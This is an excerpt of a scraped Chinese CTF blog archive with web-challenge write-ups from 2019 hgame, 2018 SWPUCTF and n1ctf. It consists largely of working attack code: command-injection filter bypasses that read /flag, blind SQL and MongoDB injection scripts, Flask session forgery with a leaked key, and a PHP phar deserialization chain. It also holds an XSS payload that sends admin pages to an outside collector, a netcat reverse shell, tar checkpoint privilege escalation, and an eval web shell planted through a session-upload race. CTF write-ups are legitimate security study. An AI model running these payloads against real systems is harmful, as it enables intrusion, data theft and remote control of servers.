world of mathematics.&lt;br/&gt;Let's warm up first.&lt;br/&gt;1+1=?\"); &#125; else if (step.toString().equals(\"2\")) &#123; model.addAttribute(\"message\", \"It seems that you have learned it, let us do a difficult question.&lt;br/&gt;&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;&lt;br/&gt;Show me the smallest integer solutions.\"); &#125; return \"math\"; &#125; @RequestMapping(value=&#123;\"/index\"&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;) public void pindex(@RequestParam(\"answer\") String answer, HttpSession session, HttpServletResponse response) throws IOException &#123; Object step = session.getAttribute(\"step\"); if (step == null) &#123; session.setAttribute(\"step\", Character.valueOf('1')); response.sendRedirect(\"/index.php\"); &#125; else if ((step.toString().equals(\"1\")) &amp;&amp; (answer.equals(\"2\"))) &#123; session.setAttribute(\"step\", \"2\"); response.sendRedirect(\"/index.php\"); &#125; &#125; @RequestMapping(value=&#123;\"/img/&#123;path&#125;\"&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;) public String image(@PathVariable(\"path\") String path, HttpServletResponse response) &#123; path = new String(Base64.getDecoder().decode(path)); InputStream f = null; OutputStream out = null; try &#123; f = new FileInputStream(\"/home/static/\" + path); out = response.getOutputStream(); int count = 0; byte[] buffer = new byte['���']; while ((count = f.read(buffer)) != -1) &#123; out.write(buffer, 0, count); out.flush(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; try &#123; f.close(); out.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return \"ok\"; &#125; @RequestMapping(value=&#123;\"/flag\"&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;) public String Flag(ModelMap model) &#123; System.out.println(\"This is the last question.\"); System.out.println(\"123852^x % 612799081 = 6181254136845 % 612799081\"); System.out.println(\"The flag is hgame&#123;x&#125;.x is a decimal number.\"); model.addAttribute(\"flag\", \"Flag is not here.\"); return \"flag\"; &#125;&#125; 所以只要找到一个满足123852^x % 612799081 = 6181254136845 % 612799081的x就行，最后爆破得到x是15387368，flag：hgame{15387368}","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/03/2019-hgame-week2/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2018SWPUCTF","date":"2019-01-30T16:00:00.000Z","path":"2019/01/31/2018SWPUCTF/","text":"用优惠码 买个X？这题首先登陆进去会有一个15位优惠码，然后用它的时候又说，优惠码过期，要用24位的优惠码扫一下泄露扫出来个www.zip123456789101112131415161718192021222324252627&lt;?php//生成优惠码$_SESSION['seed']=rand(0,999999999);function youhuima()&#123; mt_srand($_SESSION['seed']); $str_rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; $auth=''; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; setcookie('Auth', $auth);&#125;//support if (preg_match(\"/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im\",$ip))&#123; if (!preg_match(\"/\\?|flag|&#125;|cat|echo|\\*/i\",$ip))&#123; //执行命令 &#125;else &#123; //flag字段和某些字符被过滤! &#125; &#125;else&#123; // 你的输入不正确! &#125;?&gt; 看到mt_srand很容易联想到是随机数安全问题，之前暨大校赛也考过根据wonderkun师傅的博客写脚本http://wonderkun.cc/index.html/?p=585这里有个神奇的地方就是15位爆不出来，减少位数反而能爆出种子123456789101112&lt;?php$str = \"MiFgJ3paOh6LjrY\";$rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$len = 15;for ($i=0;$i&lt;$len;$i++)&#123; if ($i&lt;=($len/2))&#123; $pos = strpos($rand,$str[$i]); echo $pos.\" \".$pos.\" \".\"0\".\" \".(strlen($rand)-1).\" \"; &#125; //整理成方便 php_mt_seed 测试的格式 //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]&#125; 然后跑出来是这个148 48 0 61 8 8 0 61 41 41 0 61 6 6 0 61 45 45 0 61 29 29 0 61 15 15 0 61 0 0 0 61 然后可以看到爆出来个种子然后按回题目的脚本获取长度为24的优惠码12345678910111213&lt;?php//生成优惠码 mt_srand(415048766); $str_rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; $auth=''; $len=24; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; print $auth; 获得的优惠码是MiFgJ3pamT4pRrY9TZAteUZB，接下来就到命令执行了第一个正则可以用换行符%0a绕过，接下来到了第二个，因为他会匹配关键字，用到一些bypass技巧12345ip=127.0.0.1%0a`printf \"Y2F0IC9mbGFn\"|base64 -d`ip=127.0.0.1%0ac'a't /f'la'gip=127.0.0.1%0ac[a]t /f[l][a]gip=127.0.0.1%0atac /$(printf \"ZmxhZw==\"| base64 -d -)ip=127.0.0.1%0ac\\at /fl\\ag 然后就能拿到flag了 Injection???这题源码提示info.php，然后就能看到有mongodb扩展，没有mysql的扩展，大胆猜测是mongodb注入尝试一下admin登录进去，发现回显是username or password incorret，能确定username是admin，剩下的就是想办法获得password了这里先尝试一下check.php?username=admin&amp;password[$ne]=admin，发现会回显Nice! But it is not the real passwd，猜测应该是已经注入成功了，但是也将所有密码都返回回来，因此不能绕过，所以用正则去盲注1check.php?username=admin&amp;pasword[$regex]=^s 鉴于验证码不会识别，只能慢慢手动盲注出来……最后知道密码是skmun，登录就有flag了这里顺便挂一波4uuu Nya师傅的脚本，利用pytessercat去识别验证码，牛逼！123456789101112131415161718192021222324252627282930313233343536import pytesseractfrom PIL import Imageimport requestsimport osimport stringpassword = ''string_list = string.ascii_letters + string.digitss = requests.Session()for i in range(32): for j in string_list: res = s.get('http://123.206.213.66:45678/vertify.php') image_name = os.path.join(os.path.dirname(__file__),'yzm.jpg') with open(image_name, 'wb') as file: file.write(res.content) image = Image.open(image_name) code = pytesseract.image_to_string(image) res = s.get('http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^'+password + j +'&amp;vertify='+code) while ('CAPTCHA' in res.content): res = s.get('http://123.206.213.66:45678/vertify.php') image_name = os.path.join(os.path.dirname(__file__),'yzm.jpg') with open(image_name, 'wb') as file: file.write(res.content) image = Image.open(image_name) code = pytesseract.image_to_string(image) res = s.get('http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^'+password + j +'&amp;vertify='+code) print password+j,res.content if 'Nice!But it is not the real passwd' in res.content: password += j print password break elif 'username or password incorrect' in res.content: continueprint passwd 皇家线上赌场源码可以看见test.js和source访问/source可以看到框架和源码，猜测应该是读取文件源码/source的源码1234filename = request.args.get('file', 'test.js')if filename.find('..') != -1: return abort(403)filename = os.path.join('app/static', filename) 同时tips给了这部分源码12if filename != '/home/ctf/web/app/static/test.js' and filename.find('/home/ctf/web/app') != -1: return abort(404) 可以看到，它会将..去掉，然后再在static后面加文件名，利用点也就是在/static?file=那个地方了这里有个利用点，os.path.join函数的参数中，它会将绝对路径前面的所有参数给忽略掉通过maps文件/proc/self/maps可以读到web的路径试一下读/home/ctf/web_assli3fasdf/app/views.py读不到，这里有个小技巧，linux中/proc/self/cwd会返回当前工作目录的符号链接，然后这题的当前链接就是源码所在的目录，因此可以/static?file=/proc/self/cwd/app/views.py去读文件，然后就有源码了1234567891011121314151617181920212223242526272829303132#views.pydef register_views(app): @app.before_request def reset_account(): if request.path == '/signup' or request.path == '/login': return uname = username=session.get('username') u = User.query.filter_by(username=uname).first() if u: g.u = u g.flag = 'swpuctf&#123;xxxxxxxxxxxxxx&#125;' if uname == 'admin': return now = int(time()) if (now - u.ts &gt;= 600): u.balance = 10000 u.count = 0 u.ts = now u.save() session['balance'] = 10000 session['count'] = 0 @app.route('/getflag', methods=('POST',)) @login_required def getflag(): u = getattr(g, 'u') if not u or u.balance &lt; 1000000: return '&#123;\"s\": -1, \"msg\": \"error\"&#125;' field = request.form.get('field', 'username') mhash = hashlib.sha256(('swpu++&#123;0.' + field + '&#125;').encode('utf-8')).hexdigest() jdata = '&#123;&#123;\"&#123;0&#125;\":' + '\"&#123;1.' + field + '&#125;\", \"hash\": \"&#123;2&#125;\"&#125;&#125;' return jdata.format(field, g.u, mhash) /static?file=/proc/self/cwd/app/__init__.py把init的源码也给读了12345678910111213#__init__.pyfrom flask import Flaskfrom flask_sqlalchemy import SQLAlchemyfrom .views import register_viewsfrom .models import dbdef create_app(): app = Flask(__name__, static_folder='') app.secret_key = '9f516783b42730b7888008dd5c15fe66' app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db' register_views(app) db.init_app(app) return app 可以看到init.py里面连秘钥都给了，接下来就是session的伪造了先尝试解密又因为getflag函数里面要求balance要大于1000000，接下来进行伪造，这里有个坑点，题目是用python3写的，直接上工具加密不行12345678910from flask.sessions import SecureCookieSessionInterfaceclass App(object): secret_key = '9f516783b42730b7888008dd5c15fe66's = SecureCookieSessionInterface().get_signing_serializer(App())u = s.loads('.eJwVzDsSwyAMRdG9vNqFCP4Am8kIWRROImYAVxnvPc6tTnW_yPxmE0VydDdB6mkD6a_eynPUlxoSyJVZwqaZY1hJRXj1cwyu7PvDUy6ZluiZBBPOrs34cy9xcK-G6wctLh7_.XB7-2Q.d8W10pqlUI57tZthRyxwUddoIuQ')u['username'] = 'admin'u['balance'] = 100000000print(s.dumps(u)) 跑出来这个1.eJxFzDsOwyAQRdG9vNrFEPwBNhMNwyBZCYPkTxV570kq3-pU94PMbzZRJEd3A6SfdiD9tW_1efSXGhLI1VHCopljmElFePZjDK6W8vCUa6YpeibBgHPXzbj9zuDSVsP1BcPCID0.XFVvYg.WA0mcYbRg2pAOO-OzJe-Agg6dAM 这样我们就能伪造成admin登录进去了接下来就是格式化字符串漏洞了首先可以看到field这个可控点是拼在了g.u后面，因此需要向上跳1return jdata.format(field, g.u, mhash) 先找一下g的定义123456class AppContext(object): def __init__(self, app): self.app = app self.url_adapter = app.create_url_adapter(None) self.g = app.app_ctx_globals_class() self.refcnt = 0 先看一下当前的类1field=__class__ 可以看到我们现在的类是user，正常来说，我们应该先跳去db类，但是因为出题人给user类写了了一个save方法，我们可以先看一下这个方法有什么1field=__class__.save.__globals__ 可以看到有db，继续查看db有什么1field=__class__.save.__globals__[db].__class__.__init__.__globals__ 这里可以看到有current_app，有因为在前面register的current_app里面可以找到有g，所以可以直接调用出来1field=__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag SimplePHP这题进去可以找到两个可以利用的点，第一个是读文件，第二个是上传文件1234读文件http://120.79.158.180:11115/file.php?file=file.php上传文件http://120.79.158.180:11115/upload_file.php 先把一堆源码读出来file.php1234567891011121314151617&lt;?phpheader(\"content-type:text/html;charset=utf-8\"); include 'function.php';include 'class.php';$file = $_GET[\"file\"] ? $_GET['file'] : \"\";if(empty($file)) &#123; echo \"&lt;h2&gt;There is no file to show!&lt;h2/&gt;\";&#125;$show = new Show();if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show();&#125; else if (!empty($file))&#123; die('file doesn't exists.');&#125;?&gt; function.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php//show_source(__FILE__);include \"base.php\";header(\"Content-type: text/html;charset=utf-8\");error_reporting(E_ERROR | E_PARSE);foreach (array('_COOKIE','_POST','_GET') as $_request) &#123; foreach ($$_request as $_key=&gt;$_value) &#123; $$_key= addslashes($_value); &#125; &#125;function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); echo '&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;';&#125;function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125;&#125;function upload_file_check() &#123; global $_FILES; $allowed_types = array(\"gif\",\"jepg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); $extension = end($temp); if(empty($extension)) &#123; //echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\"; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invild file!\");&lt;/script&gt;'; return false; &#125; &#125;&#125;?&gt; class.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str['str']-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match('/http|https|file:|gopher|dict|..|f1ag/i',$this-&gt;source)) &#123; die('hacker!'); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(\"/http|https|file:|gopher|dict|../i\", $this-&gt;source)) &#123; echo \"hacker~\"; $this-&gt;source = \"index.php\"; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = \"index.php\"; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; 题目提示了flag在f1ag.php里面，同时也可以看到file.php有这样一句12345$show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; 接下来去看_show()方法12345678public function _show()&#123; if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) &#123; die('hacker!'); &#125; else &#123; highlight_file($this-&gt;source); &#125;&#125; 可以看到这里直接将f1ag过滤了，所以想直接读文件是不可能的了继续寻找可以看到Test类有个读文件的file_get()方法12345public function file_get($value)&#123; $text = base64_encode(file_get_contents($value)); return $text;&#125; 然后继续找调用了file_get()方法的方法123456789public function get($key)&#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = \"index.php\"; &#125; return $this-&gt;file_get($value);&#125; 再继续找掉用get()方法的方法1234public function __get($key)&#123; return $this-&gt;get($key);&#125; 然鹅这个方法要在调用不存在的属性的时候才会触发，看回show类，可以看见12345public function __toString()&#123; $content = $this-&gt;str['str']-&gt;source; return $content;&#125; 所以只需要将str[‘str’]换成Test类就行，然鹅这个_toString()又要怎么触发呢，同时我们也知道这个方法要在输出对象的时候才会触发然后又看到在C1e4r里面有个这样的方法12345public function __destruct()&#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test;&#125; 这里就会将对象输出，至此，pop链完整了利用C1e4r类的_destruct()中的echo $this-&gt;test去触发Show中的_toString()，利用_toString()里面的$content = $this-&gt;str[‘str’]-&gt;source去触发Test类中的_get()，然后利用file_get()方法读文件接下来就是利用了exp如下123456789101112131415&lt;?phpinclude 'class.php';$a = new Test();$a-&gt;params = ['source'=&gt;'/var/www/html/f1ag.php'];$b = new Show('index.php');$b-&gt;str['str'] = $a;$c = new C1e4r($b);echo serialize($c);$ojb = unserialize('O:5:\"C1e4r\":2:&#123;s:4:\"test\";N;s:3:\"str\";O:4:\"Show\":2:&#123;s:6:\"source\";s:9:\"index.php\";s:3:\"str\";a:1:&#123;s:3:\"str\";O:4:\"Test\":2:&#123;s:4:\"file\";N;s:6:\"params\";a:1:&#123;s:6:\"source\";s:22:\"/var/www/html/f1ag.php\";&#125;&#125;&#125;&#125;&#125;');$phar = new Phar('hhh.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('test.php','test');$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');$phar-&gt;setMetadata($ojb);$phar-&gt;stopBuffering(); 将hhh.phar改名成hhh.gif然后上传上去，又因为路径是这样的1$filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; 计算出路径然后访问1http://120.79.158.180:11115/file.php?file=phar://upload/xxx.jpg 就能拿到f1ag.php文件的源码了 有趣的邮箱注册首先在check.php发现源码1234567891011&lt;!--check.phpif($_POST['email']) &#123; $email = $_POST['email']; if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123; echo \"error email, please check your email\"; &#125;else&#123; echo \"等待管理员自动审核\"; echo $email; &#125;&#125;?&gt; 可以看到这里有个filter_var($email,FILTER_VALIDATE_EMAIL)，只需要引号括着就可以进行xss了，payload1\"&lt;script/src=http://xiaorouji.cn/youxiang.js&gt;&lt;/script&gt;\"@12.com 12345var a = new XMLHttpRequest();a.open('GET','http://localhost:6324/admin/admin.php',false);a.send(null);b = a.responseText;location.href = 'http://onsdtb.ceye.io/' + escape(b); 然后就会在自己的ceye上看到有1&lt;a href='admin/a0a.php?cmd=whoami'&gt; 这里可以看到a0a这个php下有一个命令执行的地方，尝试一下弹shell12345var a = new XMLHttpRequest();a.open('GET','http://localhost:6324/admin/a0a/php?cmd=nc+%2fbin%2fbash+vps_ip+port',false);a.send(null);b = a.responseText;location.href = 'http://onsdtb.ceye.io/' + escape(b); 成功弹了shell以后可以看到上一层的根目录下有个4f0a5ead5aef34138fcbf8cf00029e7b，访问一下看见进去这个目录可以看到一个backup.php，读一下他的源码12345678910111213&lt;?phpinclude(\"upload.php\");echo \"上传目录：\" . $upload_dir . \"&lt;br /&gt;\";$sys = \"tar -czf z.tar.gz *\";chdir($upload_dir);system($sys);if(file_exists('z.tar.gz'))&#123; echo \"上传目录下的所有文件备份成功!&lt;br /&gt;\"; echo \"备份文件名: z.tar.gz\";&#125;else&#123; echo \"未上传文件，无法备份！\";&#125;?&gt; 可以看到他会将上传过去的文件进行tar处理，接下来就是tar提权了具体参考这个https://www.freebuf.com/articles/system/176255.html我们需要上传三个文件123rouji.sh--checkpoint-action=exec=sh rouji.sh--checkpoint=1 rouji.sh的内容1cat /flag | base64 然后就能拿到flag了这场比赛质量真的是高，学到了学到了全文参考官方wp和一叶飘零师傅的wp","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/31/2018SWPUCTF/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 hgame week1","date":"2019-01-28T16:00:00.000Z","path":"2019/01/29/2019-hgame-week1/","text":"谁吃了我的flag这题题目的前半个flag提示了是泄露扫一下泄露可以扫出来.swp泄露，访问一下index.html.swp可以下载到一个文件，打开就能看到flag了 换头大作战跟着题目的要求全部换好就有flag了 very easy web源码1234567891011121314&lt;?phperror_reporting(0);include(\"flag.php\");if(strpos(\"vidar\",$_GET['id'])!==FALSE) die(\"&lt;p&gt;干巴爹&lt;/p&gt;\");$_GET['id'] = urldecode($_GET['id']);if($_GET['id'] === \"vidar\")&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; 二次编码绕过就能有flag了1http://120.78.184.111:8080/week1/very_ez/index.php?id=%2576idar can u find me?这题进去要你找到gate，查看源码看到f2.php跟过去看一下要你找到password可以在响应头看到有个password，同时又要求post方法给他，post过去以后就能看到有个链接，但是跳转的太快，只能抓包才能看清","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/29/2019-hgame-week1/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"n1ctf writeup","date":"2019-01-19T16:00:00.000Z","path":"2019/01/20/n1ctf-writeup/","text":"之前在学其他知识点的时候看到了这个比赛，顺便学一哈 77777这题的关键点在这一段代码上waf过滤了很多，但是like没有过滤，所以可以用like注入去获得password字段假如我们传过去的flag是123，hi是where (password like 0x25)查询语句就会变成1update users set points=123 where (password like 0x25) 这时分数变成了123，如果我们匹配一个错的字符分数会不变，因此就是like盲注，脚本如下12345678910111213141516171819202122232425import requestsimport stringimport urlliburl = \"http://47.97.168.223/index.php\"flag = \"\"true_flag = \"\"for i in range(1,1000): payload = flag for j in \"0123456789\"+string.letters+\"!@#$%^&amp;*()_+=&#123;&#125;~`\": data = &#123; 'flag':\"123\", \"hi\":urllib.unquote(\" where (password like 0x%s25)\"%(payload+hex(ord(j))[2:])) &#125; r = requests.post(url=url,data=data) if '123' in r.content: flag += hex(ord(j))[2:] true_flag += j print(true_flag) data1 = &#123; \"flag\":\"1\", \"hi\":\" where 1\" &#125; r = requests.post(url=url,data=data1) break 77777 2这一题也是注入，但是过滤了更加多的东西，like和非1的数字都被过滤了，剩下括号，加号和大于号。可以看到，因为(username &gt; “a”)为真，所以id=1+1=2，选出来的是id=2的用户的信息。回去题目update那里也可以用这样的方法判断pw是什么脚本123456789101112131415161718192021222324import requestsimport urlliburl = \"http://47.52.137.90:20000/index.php\"flag = \"\"for i in range(1,1000): for j in range(33,127): payload = urllib.unquote(\"%%2b( pw &gt; '%s')\"%(flag+chr(j))) data = &#123; \"flag\":\"123\", \"hi\":payload &#125; r = requests.post(url=url,data=data) if \"| 123&lt;br/&gt;\" in r.content: tmp = urllib.unquote(\"%%2b( pw &gt; '%s')\"%(flag+chr(j-1))) tmp_data = &#123; \"flag\":\"123\", \"hi\":tmp &#125; s = requests.post(url=url,data=tmp_data) if \"| 124&lt;br/&gt;\" in s.content: flag += chr(j-1) print(flag) break funning eating cms这题本来想把docker搭起来，但是中途不知道为什么一直出错，只能看着源码去学了。user.php有文件包含漏洞，可以读下源码1http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=index index.php123456789&lt;?phprequire_once \"function.php\";if(isset($_SESSION['login'] ))&#123; Header(\"Location: user.php?page=info\");&#125;else&#123; include \"templates/index.html\";&#125;?&gt; function.php（这个代码只贴关键的部分）12345678910111213141516171819202122232425262728&lt;?phpsession_start();require_once \"config.php\";function Hacker()&#123; Header(\"Location: hacker.php\"); die();&#125;function filter_directory()&#123; $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\"]; $uri = parse_url($_SERVER[\"REQUEST_URI\"]); parse_str($uri['query'], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125; 可以看到过滤了flag、manage、ffffllllaaaaggg这些关键字，但是可以看到赋值uri的时候用了parse_url，因此可以用斜杠绕过。1http://47.52.152.93:20000///user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg ffffllllaaaaggg.php1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(\"you can not visit it directly\");&#125;else &#123; echo \"you can find sth in m4aaannngggeee\";&#125;?&gt; m4aaannngggeee.php123456&lt;?phpif (FLAG_SIG != 1)&#123; die(\"you can not visit it directly\");&#125;include \"templates/upload.html\";?&gt; upload.html会将文件上传到upllloadddd.php，因此读一下upllloadddd.php1234567891011121314151617181920212223242526&lt;?php$allowtype = array(\"gif\",\"png\",\"jpg\");$size = 10000000;$path = \"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\";$filename = $_FILES['file']['name'];if(is_uploaded_file($_FILES['file']['tmp_name']))&#123; if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename))&#123; die(\"error:can not move\"); &#125;&#125;else&#123; die(\"error:not an upload file！\");&#125;$newfile = $path.$filename;echo \"file upload success&lt;br /&gt;\";echo $filename;$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");echo \"&lt;img src='data:image/png;base64,\".$picdata.\"'&gt;&lt;/img&gt;\";if($_FILES['file']['error']&gt;0)&#123; unlink($newfile); die(\"Upload file error: \");&#125;$ext = array_pop(explode(\".\",$_FILES['file']['name']));if(!in_array($ext,$allowtype))&#123; unlink($newfile);&#125;?&gt; 可以看见有这样一句话12$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");echo \"&lt;img src='data:image/png;base64,\".$picdata.\"'&gt;&lt;/img&gt;\"; system处可以进行命令注入，我们先看一下本地的可以看见，确实是可以将信息打印出来的，因此我们构造filename || ls 文件名去进行命令执行123filename=\"1.jpg || ls\"filename=\"1.jpg || `echo bHMgLw== | base64 -d`\"filename=\"1.jpg || `echo Y2F0IC9mbGFnXzIzMzMzMw== | base64 -d`\" 然后就能拿到flag了 easy php这题首先扫泄露可以扫到一些源码12345678index.php&lt;?phprequire_once 'user.php';$C = new Customer();if(isset($_GET['action']))require_once 'views/'.$_GET['action'];elseheader('Location: index.php?action=login'); 找一些可控的量12if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])if(isset($_POST['signature']) &amp;&amp; isset($_POST['mood'])) password的验证基本不可能绕过1$password = md5($_POST['password']); username过滤了一堆东西1if(preg_match('/[^a-zA-Z0-9_]/is',$username) or strlen($username)&lt;3 or strlen($username)&gt;20) 剩下两个东西12345678910111213141516function addsla_all()&#123; if (!get_magic_quotes_gpc())&#123; if (!empty($_GET))&#123; $_GET = addslashes_deep($_GET); &#125; if (!empty($_POST))&#123; $_POST = addslashes_deep($_POST); &#125; $_COOKIE = addslashes_deep($_COOKIE); $_REQUEST = addslashes_deep($_REQUEST); &#125;&#125;addsla_all();$mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));$db = new Db();@$ret = $db-&gt;insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this-&gt;userid,$this-&gt;username,$_POST['signature'],$mood)); 可以看到signature和mood会进行sql查询，引号无法使用，但是反引号还是可以用的12$db-&gt;insert(array('userid','username',' signature=1`,`123`),((select if((select database()) like 0x25,sleep(5),0)),(select 2),`12345','1'),'ctf_user_signature',array($this-&gt;userid,$this-&gt;username,$_POST['signature'],$mood)); 因此可以进行反引号注入123456789101112131415161718192021222324import requestsimport stringimport urlliburl = \"http://47.97.221.96:23333/index.php?action=publish\"flag = \"\"true_flag = \"\"cookie = &#123; \"PHPSESSID\":\"adjd54akdsoej9savry8d5sdh0\"&#125;for i in range(1,1000): print i payload = flag for j in \"0123456789.\"+string.letters+\"!@#$%^&amp;*()-+=&#123;&#125;`~_\": data = &#123; \"signature\": urllib.unquote(\"1`,`123`),((select if((select password from ctf_users limit 1)) like 0x%s25,sleep(3),0)),(select 2),`yingyingying\" % (payload + hex(ord(j))[2:])), \"mood\": \"1\" &#125; try: r = requests.post(url=url,data=data,cookies=cookie,timeout=2.5) except: flag += hex(ord(j))[2:] true_flag += j print true_flag break 然后拿到管理员的密码是nu1ladmin，但是登录发现要“you can only login at the usual address”admin的allow_ip是127.0.0.1，题目还提示了是ssrf攻击，所以这个ssrf应该是本地用户登录以后才能用。开启了upload_progress.enabled，而且还给出来session.save_path的路径，尝试一下包含1http://47.97.221.96/index.php?action=../../../../var/lib/php5/sess_bk4gtkgh5k3ul3tvaejvtqo36t 发现确实能包含1code|s:5:\"sdfa83f\"; 到了这步，考察的就是session_upload了先看一下官方的文档1http://php.net/manual/zh/session.upload-progress.php 然后我们的表单改成这样123456&lt;form action=\"http://47.97.221.96:23333\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"&lt;?=phpinfo();?&gt;\"/&gt; &lt;input type=\"file\" name=\"file1\" /&gt; &lt;input type=\"file\" name=\"file2\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; 因为cleanup为on，用条件竞争去写shell数据包12345678910111213141516171819202122232425262728293031323334#发包Cookie: PHP_SESSID = bk4gtkgh5k3ul3tvaejvtqo36tConnection: done------0123456789Content-Disposition: form-data: name=\"PHP_SESSION_UPLOAD_PROGRESS\"&lt;?=`echo'&lt;?php eval(\\$_POST[cmd]) ?&gt;'&gt;1.php`?&gt;------0123456789Content-Disposition: form-data: name=\"file1\";filename=\"dog.jpg\"Content-Type: image/jpeg&lt;script language=\"php\"&gt; phpinfo();&lt;/script&gt;-------0123456789Content-Disposition: form-data: name=\"file2\";filename=\"dog.jpg\"Content-Type: image/jpeg&lt;script language=\"php\"&gt; phpinfo();&lt;/script&gt;-------0123456789#请求GET /index.php?action=../../../../var/lib/php5/sess_bk4gtkgh5k3ul3tvaejvtqo36t HTTP/1.1Host: 47.97.221.96:23333Cache-Control: max-age=0Upgrade-Insecure-Request: 1User-Agent: xxxAccept: xxxAccept-Language: xxxCookie: PHPSESSID = bk4gtkgh5k3ul3tvaejvtqo36tConnetion: close 然后可以在/app/下面找到写进去的shell，用菜刀连过去，没有找到flag文件？？？试一下题目开头这句1dockerfile FROM andreisamuilik/php5.5.9-apache2.4-mysql5.5 找到这堆东西1234567891011121314ADD nu1lctf.tar.gz /app/RUN apt-get updateRUN 